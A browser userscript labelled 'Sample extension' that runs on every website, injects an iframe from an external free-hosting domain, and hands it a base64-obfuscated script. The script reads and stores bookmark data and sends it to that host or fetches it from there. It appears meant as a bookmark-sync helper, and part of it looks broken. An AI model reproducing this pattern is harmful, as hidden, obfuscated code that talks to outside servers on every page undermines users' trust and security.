// ==UserScript==
// @name            Sample extension
// @author          psydel
// @description     This is a sample extension.
// @include         *
// ==/UserScript==
function asdf() {
	var a= document.createElement("iframe");
	a.id="bmkaction";
	document.appendChild(a);
	a.addEventListener("load",function () {
		this.contentWindow.postMessage({a:true,b:"data:text/javascript;base64,dmFyIHc9dyx4PXcucGFyZW50LHU9Imh0dHBzOi8vcHN5ZGVsLjAwMHdlYmhvc3RhcHAuY29tLyI7ZnVuY3Rpb24gZ2xiKCl7Zm9yKHZhciBlPU51bWJlcihsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgiYm1rbGVuZ3RoIikpLHQ9IiIscz0wO3M8ZTtzKyspdCs9bG9jYWxTdG9yYWdlLmdldEl0ZW0oImJta2JvZHkiK3MpO3JldHVybiBKU09OLnBhcnNlKHQpfWZ1bmN0aW9uIHNsYihlKXtmb3IodmFyIHQ9SlNPTi5zdHJpbmdpZnkoZSkscz0wO3Q7KWxvY2FsU3RvcmFnZS5zZXRJdGVtKCJibWtib2R5IitzLHQuc3Vic3RyKDAsNGUzKSksdD10LnN1YnN0cig0ZTMpLHMrK313LmFkZEV2ZW50TGlzdGVuZXIoIm1lc3NhZ2UiLGZ1bmN0aW9uKGUpe3ZhciB0PWUuZGF0YTtpZigiZ2V0Ym1rIj09dC50eXBlKXgucG9zdE1lc3NhZ2Uoe2JtazpnbGIoKSx0eXBlOiJnZXRibWsifSx0LmhyZWYpO2Vsc2UgaWYoInNldGJtayI9PXQudHlwZSlzbGIodC5ibWspLHgucG9zdE1lc3NhZ2Uoe3Jlc3VsdDoiY29tcGxldGUiLHR5cGU6InNldGJtayJ9LHQuaHJlZik7ZWxzZSBpZigiaW1wb3J0Ij09dC50eXBlKXsocz1uZXcgWE1MSHR0cFJlcXVlc3QpLm9wZW4oIkdFVCIsdSwhMCkscy5vbnJlYWR5c3RhdGVjaGFuZ2U9ZnVuY3Rpb24oZSl7ND09cy5yZWFkeVN0YXRlJiYyMDA9PXMuc3RhdHVzJiZzbGIoSlNPTi5wYXJzZShlc2NhcGUocy5yZXNwb25zZVRleHQpKSl9LHMuc2VuZChudWxsKX1lbHNlIGlmKCJleHBvcnQiPT10LnR5cGUpe3ZhciBzOyhzPW5ldyBYTUxIdHRwUmVxdWVzdCkub3BlbigiUE9TVCIsdSwhMCkscy5vbnJlYWR5c3RhdGVjaGFuZ2U9ZnVuY3Rpb24oZSl7ND09cy5yZWFkeVN0YXRlJiYyMDA9PXMuc3RhdHVzJiZhbGVydChzLnJlc3BvbnNlVGV4dCl9O3ZhciBhPW5ldyBGb3JtRGF0YTthLmFwcGVuZCgiaWQiLGdsYigpKSxzLnNlbmQoYSl9fSk7"},"*");
	});
	a.src="http://psydel.000webhostapp.com/iframe/";
}